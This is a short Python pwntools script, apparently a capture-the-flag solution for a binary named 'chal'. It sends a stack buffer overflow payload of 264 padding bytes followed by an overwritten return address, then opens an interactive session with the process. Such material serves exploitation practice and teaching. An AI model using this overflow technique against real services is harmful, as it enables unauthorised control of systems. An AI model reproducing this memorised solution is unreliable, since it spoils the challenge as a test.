#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 13775)

    return r


context.binary = exe
def main():
    r = conn()
    payload = b'A'*264 + p64(0x00000000004011db + 5)
    r.sendline(payload)
    pause()
    r.interactive()

if __name__ == "__main__":
    main()
